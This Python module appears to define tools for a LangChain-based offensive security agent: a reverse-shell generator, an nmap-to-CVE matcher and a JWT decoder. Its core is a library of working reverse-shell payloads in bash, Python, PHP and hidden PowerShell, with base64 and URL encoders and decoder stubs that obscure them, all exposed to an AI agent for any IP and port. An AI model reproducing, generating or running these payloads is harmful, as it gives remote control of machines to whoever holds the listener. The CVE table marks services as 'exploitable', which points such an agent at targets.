"""Deterministic tool functions exposed to the LangChain agent.

STRICT RULE #2 — The LLM is *never* allowed to author payload syntax. It can
only select arguments (shell_type, encoding, ip, port, ...) and call these
tools. Every payload is assembled here from the verified ``_REVERSE_SHELL_LIBRARY``.

STRICT RULE #3 — Each tool re-validates its own arguments (defense in depth),
so even a hallucinated tool-call cannot produce an invalid/malformed payload.
"""

from __future__ import annotations

import base64
import json
import re
import urllib.parse
from typing import Any, Dict, List, Optional

from langchain_core.tools import tool

from .models import is_valid_ipv4

# ---------------------------------------------------------------------------
# 1) Reverse-shell payload library (verified, deterministic)
# ---------------------------------------------------------------------------

# fmt: off
_REVERSE_SHELL_LIBRARY: Dict[str, str] = {
    "bash": "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
    "python": (
        "python -c 'import socket,subprocess,os;"
        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        "s.connect((\"{ip}\",{port}));"
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        "subprocess.call([\"/bin/sh\",\"-i\"])'"
    ),
    "php": (
        "php -r '$sock=fsockopen(\"{ip}\",{port});"
        "exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    ),
    "powershell": (
        "powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
        "\"$client=New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
        "$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};"
        "while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{"
        "$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
        "$sendback=(iex $data 2>&1 | Out-String );"
        "$sendback2=$sendback + 'PS ' + (pwd).Path + '> ';"
        "$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);"
        "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};"
        "$client.Close()\""
    ),
}
# fmt: on

_ALLOWED_SHELL_TYPES = frozenset(_REVERSE_SHELL_LIBRARY.keys())
_ALLOWED_ENCODINGS = frozenset({"none", "url", "base64"})


def _url_encode(payload: str) -> str:
    """Percent-encode the payload for HTTP-delivery contexts."""
    return urllib.parse.quote(payload, safe="")


def _base64_encode(payload: str) -> str:
    """Base64-encode the raw command string (UTF-8)."""
    return base64.b64encode(payload.encode("utf-8")).decode("ascii")


def _base64_encode_utf16le(payload: str) -> str:
    """Base64-encode using UTF-16LE — required by PowerShell ``-EncodedCommand``."""
    return base64.b64encode(payload.encode("utf-16le")).decode("ascii")


def _wrap_encoded(payload: str, shell_type: str, encoding: str) -> str:
    """Wrap an encoded payload with the minimal decoder stub for that shell."""
    if encoding == "url":
        return _url_encode(payload)
    if encoding == "base64":
        b64 = _base64_encode(payload)
        if shell_type == "powershell":
            return f"powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {_base64_encode_utf16le(payload)}"
        if shell_type == "bash":
            return f"echo {b64} | base64 -d | bash"
        if shell_type == "python":
            return f"echo {b64} | base64 -d | python"
        if shell_type == "php":
            return f"echo {b64} | base64 -d | php"
    return payload


# ---------------------------------------------------------------------------
# 2) Nmap -> CVE knowledge base
# ---------------------------------------------------------------------------

_NMAP_SERVICE_LINE = re.compile(
    r"^(?P<port>\d+)/(?P<protocol>tcp|udp)\s+(?P<state>\S+)\s+(?P<service>\S+)"
    r"(?:\s+(?P<version>.*))?$"
)

# Each entry matches a known vulnerable service/version combination and maps it
# to one or more CVE references. This is a curated, deterministic lookup table.
_CVE_KB: List[Dict[str, Any]] = [
    {
        "service": "http",
        "product_re": re.compile(r"Apache\s+httpd", re.IGNORECASE),
        "version_re": re.compile(r"2\.4\.49\b"),
        "cves": ["CVE-2021-41773"],
        "severity": "critical",
        "summary": "Path traversal & remote code execution (Apache 2.4.49)",
    },
    {
        "service": "http",
        "product_re": re.compile(r"Apache\s+httpd", re.IGNORECASE),
        "version_re": re.compile(r"2\.4\.50\b"),
        "cves": ["CVE-2021-42013"],
        "severity": "critical",
        "summary": "Path traversal bypass of CVE-2021-41773 (Apache 2.4.50)",
    },
    {
        "service": "ftp",
        "product_re": re.compile(r"vsftpd", re.IGNORECASE),
        "version_re": re.compile(r"2\.3\.4\b"),
        "cves": ["CVE-2011-2523"],
        "severity": "critical",
        "summary": "Backdoor command execution in vsftpd 2.3.4",
    },
    {
        "service": "ssh",
        "product_re": re.compile(r"OpenSSH", re.IGNORECASE),
        "version_re": re.compile(r"7\.2p1\b"),
        "cves": ["CVE-2016-6210"],
        "severity": "medium",
        "summary": "User enumeration via timing differences (OpenSSH 7.2p1)",
    },
    {
        "service": "smtp",
        "product_re": re.compile(r"Exim", re.IGNORECASE),
        "version_re": re.compile(r"4\.8[0-9]\b"),
        "cves": ["CVE-2019-10149"],
        "severity": "critical",
        "summary": "Remote command execution in Exim 4.87-4.91",
    },
    {
        "service": "netbios",
        "product_re": re.compile(r"Samba", re.IGNORECASE),
        "version_re": re.compile(r"3\.0\.20\b"),
        "cves": ["CVE-2007-2447"],
        "severity": "high",
        "summary": "Username map script command execution (Samba 3.0.20)",
    },
    {
        "service": "microsoft",
        "product_re": re.compile(r"Microsoft\s+(Windows\s+)?(RPC|IIS)", re.IGNORECASE),
        "version_re": re.compile(r"6\.1\.7601\b"),
        "cves": ["CVE-2017-0144", "CVE-2017-0143"],
        "severity": "critical",
        "summary": "EternalBlue SMBv1 RCE (MS17-010)",
    },
    {
        "service": "http",
        "product_re": re.compile(r"nginx", re.IGNORECASE),
        "version_re": re.compile(r"1\.(?:4|5|6)\.[0-9]+\b"),
        "cves": ["CVE-2017-7529"],
        "severity": "medium",
        "summary": "Integer overflow information disclosure (nginx 1.4-1.6)",
    },
]


def _decode_base64url(part: str) -> str:
    """Decode a base64url-encoded JWT segment into a UTF-8 string."""
    padded = part + "=" * (-len(part) % 4)
    decoded = base64.urlsafe_b64decode(padded.encode("utf-8"))
    return decoded.decode("utf-8", errors="replace")


# ---------------------------------------------------------------------------
# Tool 1 — reverse shell generation
# ---------------------------------------------------------------------------
@tool
def generate_reverse_shell_tool(
    ip: str,
    port: int,
    shell_type: str,
    encoding: Optional[str] = "none",
) -> str:
    """Build a reverse-shell payload. ip: IPv4 listener. port: 1-65535. shell_type: bash|python|php|powershell. encoding: none|url|base64."""
    if not is_valid_ipv4(ip):
        return f"[error] invalid IPv4 address: {ip!r}"
    if not isinstance(port, int) or not 1 <= port <= 65535:
        return f"[error] invalid port: {port!r} (must be 1-65535)"
    shell_type = (shell_type or "").strip().lower()
    if shell_type not in _ALLOWED_SHELL_TYPES:
        allowed = ", ".join(sorted(_ALLOWED_SHELL_TYPES))
        return f"[error] unsupported shell_type: {shell_type!r} (allowed: {allowed})"
    encoding = (encoding or "none").strip().lower()
    if encoding not in _ALLOWED_ENCODINGS:
        allowed = ", ".join(sorted(_ALLOWED_ENCODINGS))
        return f"[error] unsupported encoding: {encoding!r} (allowed: {allowed})"

    payload = _REVERSE_SHELL_LIBRARY[shell_type].format(ip=ip, port=port)
    return _wrap_encoded(payload, shell_type, encoding)


# ---------------------------------------------------------------------------
# Tool 2 — Nmap -> CVE mapping
# ---------------------------------------------------------------------------
@tool
def parse_nmap_cve_tool(nmap_raw_text: str) -> List[Dict[str, Any]]:
    """Parse Nmap -sV output and map services to known CVEs. Returns list of {port, service, version, cves, severity}. Empty cves means no known match."""
    results: List[Dict[str, Any]] = []
    for line in (nmap_raw_text or "").splitlines():
        match = _NMAP_SERVICE_LINE.match(line.strip())
        if not match:
            continue
        port = int(match.group("port"))
        protocol = match.group("protocol")
        service = match.group("service")
        version = (match.group("version") or "").strip()

        cves: List[str] = []
        severity: Optional[str] = None
        summary: Optional[str] = None
        for entry in _CVE_KB:
            if entry["service"] != service:
                continue
            if entry["product_re"].search(version):
                if entry["version_re"].search(version):
                    cves.extend(entry["cves"])
                    severity = entry["severity"]
                    summary = entry["summary"]

        results.append(
            {
                "port": port,
                "protocol": protocol,
                "service": service,
                "version": version,
                "cves": sorted(set(cves)),
                "severity": severity,
                "summary": summary,
                "exploitable": bool(cves),
            }
        )
    return results


# ---------------------------------------------------------------------------
# Tool 3 — JWT analysis
# ---------------------------------------------------------------------------
@tool
def jwt_analyzer_tool(token: str) -> Dict[str, Any]:
    """Decode a JWT without verifying signature. Returns header, payload, algorithm, is_alg_none, is_hs256, warnings."""
    token = (token or "").strip()
    parts = token.split(".")
    if len(parts) != 3:
        return {
            "valid_format": False,
            "error": "token is not a valid compact JWT (expected 3 dot-separated segments)",
        }

    header_raw, payload_raw, signature = parts
    try:
        header: Dict[str, Any] = json.loads(_decode_base64url(header_raw))
    except (ValueError, UnicodeDecodeError):
        return {"valid_format": False, "error": "unable to decode JWT header"}

    try:
        payload: Dict[str, Any] = json.loads(_decode_base64url(payload_raw))
    except (ValueError, UnicodeDecodeError):
        return {"valid_format": False, "error": "unable to decode JWT payload"}

    alg = header.get("alg", "")
    warnings: List[str] = []
    if alg == "none":
        warnings.append("Algorithm 'none' detected — signature is not enforced.")
    elif alg == "HS256":
        warnings.append(
            "HMAC-SHA256 (HS256) detected — verify that a strong secret is used; "
            "weak/guessable secrets are vulnerable to forgery."
        )
    if not signature:
        warnings.append("Signature segment is empty.")

    return {
        "valid_format": True,
        "header": header,
        "payload": payload,
        "algorithm": alg,
        "is_alg_none": alg == "none",
        "is_hs256": alg == "HS256",
        "has_signature": bool(signature),
        "warnings": warnings,
    }


# ---------------------------------------------------------------------------
# Tool registry
# ---------------------------------------------------------------------------
AGENT_TOOLS = [
    generate_reverse_shell_tool,
    parse_nmap_cve_tool,
    jwt_analyzer_tool,
]
